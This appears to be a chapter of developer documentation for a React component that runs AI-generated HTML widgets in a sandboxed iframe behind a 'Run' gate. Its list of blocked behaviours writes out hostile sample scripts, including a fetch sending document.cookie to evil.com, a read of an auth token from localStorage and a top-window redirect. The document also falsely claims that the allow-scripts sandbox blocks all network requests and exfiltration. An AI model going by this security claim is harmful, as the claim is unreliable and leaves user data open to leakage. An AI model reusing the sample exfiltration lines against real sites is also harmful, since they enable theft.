# 40: Sandboxed HTML Widgets

**Source:** `src/app/components/SandboxedHtmlWidget.tsx` (47 lines)

## Why This Component Exists

Generated HTML widgets are the most powerful and most dangerous feature of the whiteboard. The assistant can generate arbitrary HTML/CSS/JS at the user's request — a countdown timer, a habit tracker, a mini-game, a data visualization.

Without sandboxing, this generated code would run in the same origin as the app, giving it access to cookies, localStorage, API tokens, DOM manipulation of the entire page, and potentially user data.

The `SandboxedHtmlWidget` component is the single choke point that ensures generated HTML runs in strict isolation.

## Component Overview

```typescript
"use client";

type SandboxedHtmlWidgetProps = {
  html: string;
  requiresConfirmation?: boolean;
  title: string;
};

export function SandboxedHtmlWidget({
  html,
  requiresConfirmation = true,
  title,
}: SandboxedHtmlWidgetProps) {
  const [confirmed, setConfirmed] = useState(!requiresConfirmation);

  if (!confirmed) {
    return <ConfirmationGate title={title} onConfirm={() => setConfirmed(true)} />;
  }

  return <IsolatedIframe html={html} title={title} />;
}
```

The component has exactly two states:
1. **Unconfirmed** — Shows a confirmation gate. The HTML does NOT render.
2. **Confirmed** — Renders the HTML inside a sandboxed iframe.

There is no third state. No "preview in a limited mode." No "render but disable JS." The binary gate ensures generated code cannot execute without explicit user intent.

## The Confirmation Gate

```tsx
if (!confirmed) {
  return (
    <div className="flex h-full flex-col justify-between gap-3 bg-white p-4 text-sm">
      <div>
        <h3 className="font-semibold">{title}</h3>
        <p className="mt-2 text-[#4b5563]">
          Generated HTML is sandboxed and isolated.
        </p>
      </div>
      <button
        className="min-h-11 rounded-md bg-[#2f5d50] px-4 font-semibold text-white"
        onClick={() => setConfirmed(true)}
        type="button"
      >
        Run
      </button>
    </div>
  );
}
```

### Gate Design

The gate shows:
1. **Widget title** — So the user knows what they're confirming.
2. **Safety message** — "Generated HTML is sandboxed and isolated." This reassures users that clicking "Run" is relatively safe.
3. **Run button** — The only action. No "Cancel" needed because the gate is inside the widget area — the user can ignore it or resize/delete the canvas item.

The button's `min-h-11` (44px) ensures it meets touch target minimums (iOS guidelines require 44pt). The green color (`#2f5d50`) is the app's accent, signaling a positive/constructive action.

### What the Gate Does NOT Do

- Does NOT show the HTML source code (users don't need to read code to trust it).
- Does NOT ask for permission granularity (HTML widgets get all-or-nothing sandboxing).
- Does NOT persist confirmation (each render cycle resets — the gate reappears on remount).
- Does NOT warn about specific risks (no "this widget uses network requests" analysis).

The gate is a binary "yes, run this" — not a nuanced permission system. That level of permission control exists in the server-side `permissions.ts` module (see chapter 41), not in this component.

## The Isolated Iframe

```tsx
return (
  <iframe
    className="h-full w-full border-0"
    referrerPolicy="no-referrer"
    sandbox="allow-scripts"
    srcDoc={html}
    title={title}
  />
);
```

### `sandbox="allow-scripts"` — What's Allowed and What's Not

The `sandbox` attribute on iframes is the browser's native security mechanism. Setting it to `"allow-scripts"` enables JavaScript execution within the iframe while **disabling everything else** by default.

| Capability | Status | Why |
|---|---|---|
| Script execution | ✅ Allowed | Widgets need JS to be interactive |
| Same-origin access | ❌ Disabled | Cannot access parent page's DOM, cookies, localStorage |
| Form submission | ❌ Disabled | Cannot POST data to external servers |
| Popups / new windows | ❌ Disabled | Cannot open new tabs/windows |
| Navigation (top-level) | ❌ Disabled | Cannot redirect the parent page |
| Downloads | ❌ Disabled | Cannot trigger file downloads |
| Pointer lock | ❌ Disabled | Cannot lock the cursor |
| Modals (alert/confirm/prompt) | ❌ Disabled | Cannot block the UI with dialogs |
| Automatic features (autoplay) | ❌ Disabled | Cannot auto-play media |
| Storage access | ❌ Disabled | No localStorage, sessionStorage, IndexedDB, cookies |

Only `allow-scripts` is explicitly enabled. Everything else is blocked by default (the spec says: without `allow-*` tokens, the feature is disabled).

This is the safest possible configuration that still allows interactive widgets. If a widget tries to access `window.parent`, it gets a restricted proxy. If it tries to use `localStorage`, it gets a SecurityError. If it tries to `fetch()`, it fails.

### `referrerPolicy="no-referrer"` — No Leaking Referrer Headers

Without this, if a widget somehow makes a network request (despite sandboxing, possibly through creative iframe nesting), the `Referer` header could leak the app's URL. `no-referrer` prevents any referrer information from being sent.

### `srcDoc` — No External URLs

```tsx
srcDoc={html}
```

`srcDoc` embeds the HTML directly in the iframe's `srcdoc` attribute. This means:
1. The widget's source is local — no external URL to fetch.
2. The widget loads synchronously with the iframe — no network round-trip.
3. The widget cannot be compromised by a man-in-the-middle attack (no HTTP request).
4. The widget's code is fully controlled by the app — no third-party CDN concerns.

An alternative would be `src={blob:...}` (createObjectURL), but `srcDoc` is simpler and avoids managing blob URL lifecycle.

### `title={title}` — Accessibility

The `title` attribute provides an accessible name for screen readers. If a widget has the title "Countdown Timer," a screen reader user navigating iframes will hear "Countdown Timer" rather than a generic "frame."

### No `allow` Attribute

The newer `allow` attribute (Permissions Policy / Feature Policy) is not set. This means:
- No camera, microphone, geolocation.
- No clipboard access.
- No payment API.
- No autoplay.

The browser defaults (which deny everything for sandboxed iframes) are sufficient.

## Safety Constraints Summary

The component enforces exactly four layers of safety:

| Layer | Mechanism | What It Prevents |
|---|---|---|
| 1. User gate | `confirmed` state | Unintended code execution |
| 2. Origin isolation | `sandbox` without `allow-same-origin` | Access to app cookies, tokens, DOM |
| 3. Feature denial | `sandbox` without `allow-forms`, `allow-popups`, etc. | Navigation, submission, trickery |
| 4. No network | No `allow-same-origin` + `referrerPolicy` + `srcDoc` | Data exfiltration, external requests |

## What Widgets CAN Do (Within These Constraints)

Even with strict sandboxing, useful widgets are possible:

```html
<!-- ✅ Countdown timer (DOM manipulation only) -->
<div id="timer">Loading...</div>
<script>
  const target = new Date("2025-01-01").getTime();
  setInterval(() => {
    const now = Date.now();
    const diff = target - now;
    document.getElementById("timer").textContent =
      `${Math.floor(diff / 86400000)} days remaining`;
  }, 1000);
</script>
```

```html
<!-- ✅ Interactive checklist (no network needed) -->
<div id="list"></div>
<script>
  const items = ["Wake up", "Exercise", "Read"];
  document.getElementById("list").innerHTML = items
    .map((item, i) => `<label><input type="checkbox" id="i${i}"> ${item}</label>`)
    .join("<br>");
</script>
```

## What Widgets CANNOT Do

```html
<!-- ❌ Network request -->
<script>
  fetch("https://evil.com/steal?data=" + document.cookie);
  // Error: Failed to fetch (sandboxed, no same-origin)
</script>

<!-- ❌ Access parent app -->
<script>
  window.parent.document.cookie;
  // Error: Blocked a frame with origin "null" from accessing a cross-origin frame
</script>

<!-- ❌ Steal tokens from localStorage -->
<script>
  localStorage.getItem("auth_token");
  // Error: SecurityError - sandboxed iframe blocks storage
</script>

<!-- ❌ Redirect parent page -->
<script>
  window.top.location = "https://evil.com";
  // Error: sandboxed iframe blocks top-level navigation
</script>
```

## What's NOT in This Component (and Why)

### No PostMessage Bridge

There is no `window.postMessage` communication between the iframe and the parent app. This means:
- The widget cannot read/write board state automatically.
- The widget cannot invoke assistant tools.
- The widget cannot notify the parent of state changes.

This is intentional for the initial implementation. A postMessage bridge would be a permission-gated feature in the future (see chapter 41 — `tools.invoke` permission).

### No Window Size Adaptation

The iframe fills the parent container (`h-full w-full`) but doesn't communicate its intrinsic size back. This means widgets with dynamic content (e.g., a growing list) can overflow. The parent sets the canvas item height, and the iframe scrolls internally.

### No Theme Synchronization

Widgets don't inherit the app's CSS variables or dark/light mode settings. If a widget wants to match the app's theme, it must define its own styles. A future `window.__APP_THEME__` global could be injected into `srcDoc`, but that's not implemented.

### No Error Boundaries

If the widget's JavaScript throws an uncaught error, the iframe's JS environment crashes but the parent app is unaffected (the iframe is a separate browsing context). However, there's no user-facing error message — the widget just stops working silently.

## Comparison to Other Widget Approaches

| Approach | Security | Capability | Complexity |
|---|---|---|---|
| React component (prebuilt) | Full trust (code-reviewed) | Full app access | Low (standard React) |
| Sandboxed iframe (this) | Maximum isolation | JS only in iframe | Low (native browser) |
| Web Worker + postMessage | Origin-bound | Background processing | High (message serialization) |
| Shadow DOM + sanitized HTML | No JS isolation | No scripts | Very low |
| Custom renderer (e.g., Blockly) | Interpretation-only | Limited to block model | Very high |

The sandboxed iframe is the right choice for MVP: maximum safety, minimal code, sufficient capability for useful widgets.

## Design Decisions

**Why `requiresConfirmation` defaults to `true`?**
Safety-first. If a developer forgets to pass `requiresConfirmation`, the widget requires confirmation. You must explicitly opt into auto-run: `<SandboxedHtmlWidget requiresConfirmation={false} ... />`.

**Why not use `allow-same-origin`?**
`allow-same-origin` treats the iframe content as same-origin, which would grant access to cookies, localStorage, and the parent DOM. Combined with `allow-scripts`, this essentially removes all sandboxing. Never use these two together for untrusted content.

**Why 47 lines?**
The component is deliberately tiny. Every line of sandbox code is a line that could have a bug. A small component is easier to audit, test, and trust. The heavy lifting is done by the browser's iframe sandbox, which is battle-tested across billions of users.
